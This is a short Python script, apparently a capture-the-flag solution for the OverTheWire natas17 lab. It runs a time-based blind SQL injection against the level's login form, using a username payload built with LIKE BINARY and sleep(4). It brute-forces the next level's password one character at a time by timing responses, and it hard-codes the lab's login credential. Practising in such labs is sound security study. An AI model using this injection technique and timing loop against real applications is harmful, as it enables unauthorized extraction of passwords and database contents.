# Name: Michael Krakovsky
# Date: April 20, 2019
# Description: Create a script to break the code on natas17.
# Version: 1.0

from requests import post
from string import ascii_letters
from string import digits

def makeRequests(currentPasswrd):

    # Function Description: Execute the password to see whehter the page response will tell us anything about the page.
    # Paramters: currentPasswrd (The current build of the password)
    # Throws: None  # Returns: getResponse.elapsed.total_seconds() (The time it takes for the webpage to execute) 

    payload = {'username': "natas18\" and password Like binary \"" + currentPasswrd + "%\" and sleep(4) #"}
    getResponse = post("http://natas17.natas.labs.overthewire.org/", data=payload,
            auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))      # Used to establish a connection and get requests
    return getResponse.elapsed.total_seconds()

def threadThroughChars(alphabet, currentPasswrd, startingIndex, endingIndex):

    # Function Description: Loop through an alphabet creating threads and return the next iteration of the alphabet.
    # Parameters: alphabet (The ASCII string of letters to loop through; however, this could be customised), 
    # startingIndex (The location in the ASCII string in which the thread starts), endingIndex (Where to stop the search), 
    # currentPasswrd (The current build of the password)
    # Throws: newPasswrd (The new successful password) # Returns: (The letter which triggers a longer response) 

    for i in range(startingIndex, endingIndex):
        newPasswrd = currentPasswrd + alphabet[i]
        if makeRequests(newPasswrd) > 3:
            return newPasswrd                   # Return the new password
    return None                                 # Should never get here, an error has occured

currentPsswd = ""
for i in range(0, 32):
    checkResponse = threadThroughChars(ascii_letters + digits, currentPsswd, 0, len(ascii_letters + digits))
    if (checkResponse != None):
        currentPsswd = checkResponse
        print(currentPsswd)
    else:
        raise ValueError("None should Never be Raised!.")
